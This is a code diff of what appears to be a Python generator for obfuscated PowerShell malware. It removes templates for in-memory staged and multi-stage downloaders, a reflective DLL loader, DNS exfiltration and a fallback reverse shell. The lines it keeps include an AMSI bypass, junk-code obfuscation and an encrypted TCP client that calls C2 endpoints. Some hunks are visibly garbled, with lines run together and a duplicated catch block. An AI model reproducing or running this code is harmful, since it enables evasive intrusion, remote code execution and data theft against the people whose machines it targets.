@@ -18,17 +18,6 @@ import json
 from config import config
 from logging_config import app_logger, performance_logger, PerformanceTracker
 
-# Import evasion techniques with fallback
-try:
-    from evasion import apply_evasion_techniques, get_available_evasion_techniques
-    EVASION_AVAILABLE = True
-except ImportError:
-    EVASION_AVAILABLE = False
-    def apply_evasion_techniques(payload, *args, **kwargs):
-        return payload
-    def get_available_evasion_techniques():
-        return []
-
 class ObfuscationEngine:
     """Advanced obfuscation engine with multiple techniques"""
     
@@ -242,135 +231,6 @@ function {func_name} {{
 }}
 '''
 
-    @staticmethod
-    def get_staged_downloader_template() -> str:
-        return '''
-# Staged Payload Downloader - In-Memory Execution
-function {func_name} {{
-    param(${url_var}, ${key_var})
-    try {{
-        ${web_client_var} = New-Object System.Net.WebClient
-        ${web_client_var}.Headers.Add({user_agent_header}, {user_agent_value})
-        ${web_client_var}.Headers.Add({content_type_header}, {content_type_value})
-        
-        # Download staged payload
-        ${raw_data_var} = ${web_client_var}.DownloadData(${url_var})
-        
-        # Decrypt if key provided
-        if (${key_var}) {{
-            ${decrypted_var} = {decrypt_function}(${raw_data_var}, ${key_var})
-            ${payload_var} = [System.Text.Encoding]::UTF8.GetString(${decrypted_var})
-        }} else {{
-            ${payload_var} = [System.Text.Encoding]::UTF8.GetString(${raw_data_var})
-        }}
-        
-        # Execute in memory
-        Invoke-Expression ${payload_var}
-        
-    }} catch {{
-        # Fallback to alternative methods
-        {fallback_code}
-    }}
-}}
-'''
-
-    @staticmethod
-    def get_multi_stage_template() -> str:
-        return '''
-# Multi-Stage Payload Loader
-function {func_name} {{
-    param(${urls_var}, ${decryption_key_var})
-    
-    ${stage_counter_var} = {initial_stage}
-    ${max_stages_var} = {max_stages}
-    ${payload_parts_var} = @()
-    
-    while (${stage_counter_var} -le ${max_stages_var}) {{
-        try {{
-            ${current_url_var} = ${urls_var}[${stage_counter_var} - 1]
-            ${web_client_var} = New-Object System.Net.WebClient
-            
-            # Randomize headers
-            ${web_client_var}.Headers.Add({random_header_name}, {random_header_value})
-            
-            ${stage_data_var} = ${web_client_var}.DownloadString(${current_url_var})
-            ${payload_parts_var} += ${stage_data_var}
-            
-            ${stage_counter_var}++
-            Start-Sleep -Milliseconds (Get-Random -Minimum {min_delay} -Maximum {max_delay})
-            
-        }} catch {{
-            break
-        }}
-    }}
-    
-    if (${payload_parts_var}.Count -gt 0) {{
-        ${combined_payload_var} = ${payload_parts_var} -join ''
-        ${final_payload_var} = {decode_function}(${combined_payload_var}, ${decryption_key_var})
-        Invoke-Expression ${final_payload_var}
-    }}
-}}
-'''
-
-    @staticmethod
-    def get_reflective_loader_template() -> str:
-        return '''
-# Reflective DLL Loader Template
-function {func_name} {{
-    param(${dll_url_var}, ${function_name_var}, ${args_var})
-    
-    try {{
-        # Download DLL bytes
-        ${web_client_var} = New-Object System.Net.WebClient
-        ${dll_bytes_var} = ${web_client_var}.DownloadData(${dll_url_var})
-        
-        # Load assembly from memory
-        ${assembly_var} = [System.Reflection.Assembly]::Load(${dll_bytes_var})
-        
-        # Get type and method
-        ${type_var} = ${assembly_var}.GetTypes() | Where-Object {{ $_.Name -eq {target_class} }}
-        ${method_var} = ${type_var}.GetMethod(${function_name_var})
-        
-        # Invoke method
-        ${method_var}.Invoke($null, ${args_var})
-        
-    }} catch {{
-        # Alternative payload execution
-        {alternative_payload}
-    }}
-}}
-'''
-
-    @staticmethod
-    def get_dns_exfil_template() -> str:
-        return '''
-# DNS Exfiltration Template
-function {func_name} {{
-    param(${data_var}, ${domain_var})
-    
-    try {{
-        ${encoded_data_var} = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(${data_var}))
-        ${chunks_var} = @()
-        
-        for (${i_var} = 0; ${i_var} -lt ${encoded_data_var}.Length; ${i_var} += {chunk_size}) {{
-            ${chunk_var} = ${encoded_data_var}.Substring(${i_var}, [Math]::Min({chunk_size}, ${encoded_data_var}.Length - ${i_var}))
-            ${chunks_var} += ${chunk_var}
-        }}
-        
-        ${counter_var} = 0
-        foreach (${chunk_var} in ${chunks_var}) {{
-            ${subdomain_var} = {subdomain_format}
-            try {{
-                Resolve-DnsName ${subdomain_var} -ErrorAction SilentlyContinue
-            }} catch {{}}
-            ${counter_var}++
-            Start-Sleep -Milliseconds (Get-Random -Minimum {min_delay} -Maximum {max_delay})
-        }}
-        
-    }} catch {{}}
-}}
-'''
-
 class PayloadGenerator:
     """Enhanced payload generator with modular architecture"""
     
@@ -514,137 +374,27 @@ try {{
                 date_name = self.obfuscator.morph_name('date')
                 junk_blocks.append(f"${date_name} = Get-Date; ${date_name} = ${date_name}.AddDays({self.obfuscator.obfuscate_int(random.randint(-30, 30))})")
         
-        return junk_blocks    def generate_payload_content(self, payload_type: str = "staged", staging_urls: List[str] = None, encryption_key: str = None) -> str:
+        return junk_blocks
+
+    def generate_payload_content(self) -> str:
         """Generate payload content without writing to file"""
         with self.generation_lock:
             try:
-                # Determine payload type
-                if staging_urls is None:
-                    staging_urls = [
-                        f"http://{ep['host']}:{ep['port']}/stage1",
-                        f"http://{ep['host']}:{ep['port']}/stage2",
-                        f"http://{ep['host']}:{ep['port']}/stage3"
-                    ] if config.C2_ENDPOINTS else ["http://example.com/stage1"]
-                
-                if encryption_key is None:
-                    encryption_key = base64.b64encode(os.urandom(16)).decode()[:16]  # 16 char key
+                # Generate morphed variable names
+                vars_map = {k: self.obfuscator.morph_name(k) for k in [
+                    'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 
+                    'sendbyte', 'encoding', 'readLength', 'aes', 'encryptor', 
+                    'iv', 'key', 'cmd', 'result', 'junk', 'success'
+                ]}
 
-                # AMSI bypass section (always included)
+                # AMSI bypass section
                 amsi_bypass = self.random_amsi_bypass()
 
-                # Generate payload based on type
-                if payload_type == "staged":
-                    main_payload = self.generate_staged_downloader(staging_urls[:1], encryption_key)
-                elif payload_type == "multi_stage":
-                    main_payload = self.generate_multi_stage_loader(staging_urls, encryption_key)
-                elif payload_type == "reflective":
-                    dll_url = staging_urls[0] if staging_urls else "http://example.com/payload.dll"
-                    main_payload = self.generate_reflective_loader(dll_url, "Main")
-                else:  # Default to traditional payload
-                    main_payload = self._generate_traditional_payload()
-
-                # Generate junk code blocks
-                junk_blocks = self.generate_junk_code()
+                # Generate AES setup with enhanced obfuscation
+                aes_key = base64.b64encode(os.urandom(32)).decode()
+                aes_iv = base64.b64encode(os.urandom(16)).decode()
                 
-                # Build final payload
-                payload = "$ErrorActionPreference = 'SilentlyContinue'\n\n"
-                
-                # Add enhanced helper functions for staging
-                payload += self._generate_staging_helpers()
-                
-                # Add AMSI bypass first
-                payload += amsi_bypass + '\n\n'
-                
-                # Insert junk code randomly
-                blocks = [main_payload]
-                for junk in junk_blocks:
-                    idx = random.randint(0, len(blocks))
-                    blocks.insert(idx, junk)
-                
-                # Add all blocks
-                payload += '\n'.join(blocks)
-                
-                # Calculate complexity score
-                self._complexity_score = self._calculate_complexity_score(payload)
-                
-                app_logger.debug(f"Generated {payload_type} payload with complexity score: {self._complexity_score}")
-                
-                return payload
-
-            except Exception as e:
-                app_logger.error(f"Error generating payload content: {str(e)}", exc_info=e)
-                # Return a basic error payload
-                return f"""
-# Error generating payload: {str(e)}
-Write-Host 'Failed to generate payload'
-$ErrorActionPreference = 'SilentlyContinue'
-"""
-
-    def _generate_staging_helpers(self) -> str:
-        """Generate helper functions for staged payloads"""
-        return """
-# Enhanced staging helper functions
-function Invoke-MemoryDownload {
-    param([string]$Url, [string]$Key)
-    try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
-        $data = $wc.DownloadData($Url)
-        if ($Key) {
-            $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
-            for ($i = 0; $i -lt $data.Length; $i++) {
-                $data[$i] = $data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
-            }
-        }
-        return [System.Text.Encoding]::UTF8.GetString($data)
-    } catch {
-        return $null
-    }
-}
-
-function Invoke-ReflectiveLoad {
-    param([byte[]]$Assembly, [string]$Method, [object[]]$Arguments)
-    try {
-        $loadedAssembly = [System.Reflection.Assembly]::Load($Assembly)
-        $type = $loadedAssembly.GetTypes() | Where-Object { $_.Name -eq 'Program' } | Select-Object -First 1
-        if ($type) {
-            $method = $type.GetMethod($Method)
-            if ($method) {
-                $method.Invoke($null, $Arguments)
-            }
-        }
-    } catch {}
-}
-
-function Test-NetworkConnection {
-    param([string]$Host, [int]$Port, [int]$Timeout = 3000)
-    try {
-        $client = New-Object System.Net.Sockets.TcpClient
-        $result = $client.BeginConnect($Host, $Port, $null, $null)
-        $success = $result.AsyncWaitHandle.WaitOne($Timeout, $false)
-        $client.Close()
-        return $success
-    } catch {
-        return $false
-    }
-}
-
-"""
-
-    def _generate_traditional_payload(self) -> str:
-        """Generate traditional reverse shell payload"""
-        # Generate morphed variable names
-        vars_map = {k: self.obfuscator.morph_name(k) for k in [
-            'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 
-            'sendbyte', 'encoding', 'readLength', 'aes', 'encryptor', 
-            'iv', 'key', 'cmd', 'result', 'junk', 'success'
-        ]}
-
-        # Generate AES setup with enhanced obfuscation
-        aes_key = base64.b64encode(os.urandom(32)).decode()
-        aes_iv = base64.b64encode(os.urandom(16)).decode()
-        
-        aes_block = f"""
+                aes_block = f"""
 try {{
     ${vars_map['aes']} = [System.Security.Cryptography.Aes]::Create()
     ${vars_map['aes']}.Key = [Convert]::FromBase64String({self.obfuscator.obfuscate_string(aes_key)})
@@ -655,9 +405,9 @@ try {{
 }}
 """
 
-        # Network operations with C2 endpoints
-        c2_endpoints = config.C2_ENDPOINTS
-        network_block = f"""
+                # Network operations with C2 endpoints
+                c2_endpoints = config.C2_ENDPOINTS
+                network_block = f"""
 try {{
     ${vars_map['client']} = New-Object System.Net.Sockets.TCPClient
     $endpoint = @(
@@ -670,11 +420,6 @@ try {{
     }}
     ${vars_map['client']}.Close()
 }} catch {{
-    $null
-}}
-"""
-
-        return aes_block + "\n" + network_block
     $null
 }}
 """
@@ -769,216 +514,6 @@ $ErrorActionPreference = 'SilentlyContinue'
     def last_complexity_score(self) -> int:
         """Get the complexity score of the last generated payload"""
         return self._complexity_score
-
-    def generate_staged_downloader(self, staging_urls: List[str], encryption_key: Optional[str] = None) -> str:
-        """Generate a staged payload downloader that fetches and executes payloads in memory"""
-        
-        # Generate variable names
-        vars_map = {
-            'func_name': self.obfuscator.morph_name('Download'),
-            'url_var': self.obfuscator.morph_name('url'),
-            'key_var': self.obfuscator.morph_name('key'),
-            'web_client_var': self.obfuscator.morph_name('client'),
-            'raw_data_var': self.obfuscator.morph_name('data'),
-            'decrypted_var': self.obfuscator.morph_name('decrypted'),
-            'payload_var': self.obfuscator.morph_name('payload')
-        }
-        
-        # Create encryption/decryption function
-        if encryption_key:
-            decrypt_function = self._generate_decrypt_function(encryption_key)
-        else:
-            decrypt_function = "${raw_data_var}"
-        
-        # Generate fallback code
-        fallback_code = self._generate_fallback_payload()
-        
-        # Create staged downloader
-        template = self.templates.get_staged_downloader_template()
-        downloader = template.format(
-            func_name=vars_map['func_name'],
-            url_var=vars_map['url_var'],
-            key_var=vars_map['key_var'],
-            web_client_var=vars_map['web_client_var'],
-            raw_data_var=vars_map['raw_data_var'],
-            decrypted_var=vars_map['decrypted_var'],
-            payload_var=vars_map['payload_var'],
-            user_agent_header=self.obfuscator.obfuscate_string('User-Agent'),
-            user_agent_value=self.obfuscator.obfuscate_string(self._get_random_user_agent()),
-            content_type_header=self.obfuscator.obfuscate_string('Content-Type'),
-            content_type_value=self.obfuscator.obfuscate_string('application/octet-stream'),
-            decrypt_function=decrypt_function,
-            fallback_code=fallback_code
-        )
-        
-        # Generate main execution logic
-        main_logic = f"""
-# Staged Payload Execution
-${vars_map['url_var']} = @(
-    {','.join([self.obfuscator.obfuscate_string(url) for url in staging_urls])}
-) | Get-Random
-
-${vars_map['key_var']} = {self.obfuscator.obfuscate_string(encryption_key) if encryption_key else '$null'}
-
-{vars_map['func_name']} -${vars_map['url_var']} ${vars_map['url_var']} -${vars_map['key_var']} ${vars_map['key_var']}
-"""
-        
-        return downloader + "\n" + main_logic
-
-    def generate_multi_stage_loader(self, stage_urls: List[str], encryption_key: Optional[str] = None) -> str:
-        """Generate a multi-stage payload loader"""
-        
-        vars_map = {
-            'func_name': self.obfuscator.morph_name('LoadStages'),
-            'urls_var': self.obfuscator.morph_name('urls'),
-            'decryption_key_var': self.obfuscator.morph_name('key'),
-            'stage_counter_var': self.obfuscator.morph_name('stage'),
-            'max_stages_var': self.obfuscator.morph_name('maxStages'),
-            'payload_parts_var': self.obfuscator.morph_name('parts'),
-            'current_url_var': self.obfuscator.morph_name('currentUrl'),
-            'web_client_var': self.obfuscator.morph_name('client'),
-            'stage_data_var': self.obfuscator.morph_name('stageData'),
-            'combined_payload_var': self.obfuscator.morph_name('combined'),
-            'final_payload_var': self.obfuscator.morph_name('final')
-        }
-        
-        decode_function = self._generate_decode_function(encryption_key) if encryption_key else "${combined_payload_var}"
-        
-        template = self.templates.get_multi_stage_template()
-        loader = template.format(
-            func_name=vars_map['func_name'],
-            urls_var=vars_map['urls_var'],
-            decryption_key_var=vars_map['decryption_key_var'],
-            stage_counter_var=vars_map['stage_counter_var'],
-            max_stages_var=vars_map['max_stages_var'],
-            payload_parts_var=vars_map['payload_parts_var'],
-            current_url_var=vars_map['current_url_var'],
-            web_client_var=vars_map['web_client_var'],
-            stage_data_var=vars_map['stage_data_var'],
-            combined_payload_var=vars_map['combined_payload_var'],
-            final_payload_var=vars_map['final_payload_var'],
-            initial_stage=self.obfuscator.obfuscate_int(1),
-            max_stages=self.obfuscator.obfuscate_int(len(stage_urls)),
-            random_header_name=self.obfuscator.obfuscate_string(self._get_random_header_name()),
-            random_header_value=self.obfuscator.obfuscate_string(self._get_random_header_value()),
-            min_delay=self.obfuscator.obfuscate_int(100),
-            max_delay=self.obfuscator.obfuscate_int(1000),
-            decode_function=decode_function
-        )
-        
-        # Generate execution logic
-        execution_logic = f"""
-# Multi-Stage Execution
-${vars_map['urls_var']} = @(
-    {','.join([self.obfuscator.obfuscate_string(url) for url in stage_urls])}
-)
-
-${vars_map['decryption_key_var']} = {self.obfuscator.obfuscate_string(encryption_key) if encryption_key else '$null'}
-
-{vars_map['func_name']} -${vars_map['urls_var']} ${vars_map['urls_var']} -${vars_map['decryption_key_var']} ${vars_map['decryption_key_var']}
-"""
-        
-        return loader + "\n" + execution_logic
-
-    def generate_reflective_loader(self, dll_url: str, target_function: str) -> str:
-        """Generate a reflective DLL loader"""
-        
-        vars_map = {
-            'func_name': self.obfuscator.morph_name('ReflectiveLoad'),
-            'dll_url_var': self.obfuscator.morph_name('dllUrl'),
-            'function_name_var': self.obfuscator.morph_name('funcName'),
-            'args_var': self.obfuscator.morph_name('args'),
-            'web_client_var': self.obfuscator.morph_name('client'),
-            'dll_bytes_var': self.obfuscator.morph_name('dllBytes'),
-            'assembly_var': self.obfuscator.morph_name('assembly'),
-            'type_var': self.obfuscator.morph_name('type'),
-            'method_var': self.obfuscator.morph_name('method')
-        }
-        
-        alternative_payload = self._generate_fallback_payload()
-        
-        template = self.templates.get_reflective_loader_template()
-        loader = template.format(
-            func_name=vars_map['func_name'],
-            dll_url_var=vars_map['dll_url_var'],
-            function_name_var=vars_map['function_name_var'],
-            args_var=vars_map['args_var'],
-            web_client_var=vars_map['web_client_var'],
-            dll_bytes_var=vars_map['dll_bytes_var'],
-            assembly_var=vars_map['assembly_var'],
-            type_var=vars_map['type_var'],
-            method_var=vars_map['method_var'],
-            target_class=self.obfuscator.obfuscate_string('Program'),
-            alternative_payload=alternative_payload
-        )
-        
-        # Generate execution logic
-        execution_logic = f"""
-# Reflective DLL Loading
-${vars_map['dll_url_var']} = {self.obfuscator.obfuscate_string(dll_url)}
-${vars_map['function_name_var']} = {self.obfuscator.obfuscate_string(target_function)}
-${vars_map['args_var']} = @()
-
-{vars_map['func_name']} -${vars_map['dll_url_var']} ${vars_map['dll_url_var']} -${vars_map['function_name_var']} ${vars_map['function_name_var']} -${vars_map['args_var']} ${vars_map['args_var']}
-"""
-        
-        return loader + "\n" + execution_logic    def _generate_decrypt_function(self, key: str) -> str:
-        """Generate a decryption function"""
-        func_name = self.obfuscator.morph_name('Decrypt')
-        data_var = self.obfuscator.morph_name('data')
-        key_var = self.obfuscator.morph_name('key')
-        i_var = self.obfuscator.morph_name('i')
-        
-        return f"""
-function {func_name} {{
-    param([byte[]]${data_var}, [string]${key_var})
-    # Simple XOR decryption
-    ${key_var}_bytes = [System.Text.Encoding]::UTF8.GetBytes(${key_var})
-    for (${i_var} = 0; ${i_var} -lt ${data_var}.Length; ${i_var}++) {{
-        ${data_var}[${i_var}] = ${data_var}[${i_var}] -bxor ${key_var}_bytes[${i_var} % ${key_var}_bytes.Length]
-    }}
-    return ${data_var}
-}}
-
-{func_name} ${data_var} ${key_var}
-"""
-
-    def _generate_decode_function(self, key: str) -> str:
-        """Generate a decode function for multi-stage payloads"""
-        func_name = self.obfuscator.morph_name('Decode')
-        return f"{func_name}(${'{combined_payload_var}'}, ${'{decryption_key_var}'})"
-
-    def _generate_fallback_payload(self) -> str:
-        """Generate a fallback payload"""
-        return f"""
-# Fallback - Basic reverse shell
-try {{
-    ${self.obfuscator.morph_name('client')} = New-Object System.Net.Sockets.TCPClient
-    ${self.obfuscator.morph_name('endpoint')} = @({','.join([f'({self.obfuscator.obfuscate_string(ep["host"])}, {self.obfuscator.obfuscate_int(ep["port"])})' for ep in config.C2_ENDPOINTS])}) | Get-Random
-    ${self.obfuscator.morph_name('client')}.Connect(${self.obfuscator.morph_name('endpoint')}[0], ${self.obfuscator.morph_name('endpoint')}[1])
-}} catch {{}}
-"""
-
-    def _get_random_user_agent(self) -> str:
-        """Get a random user agent string"""
-        user_agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101'
-        ]
-        return random.choice(user_agents)
-
-    def _get_random_header_name(self) -> str:
-        """Get a random HTTP header name"""
-        headers = ['X-Forwarded-For', 'X-Real-IP', 'X-Client-IP', 'X-Originating-IP', 'X-Request-ID']
-        return random.choice(headers)
-
-    def _get_random_header_value(self) -> str:
-        """Get a random HTTP header value"""
-        values = ['127.0.0.1', '192.168.1.100', '10.0.0.1', 'localhost', '::1']
-        return random.choice(values)
 
 # Backwards compatibility functions
 def generate_metamorphic_payload() -> str:
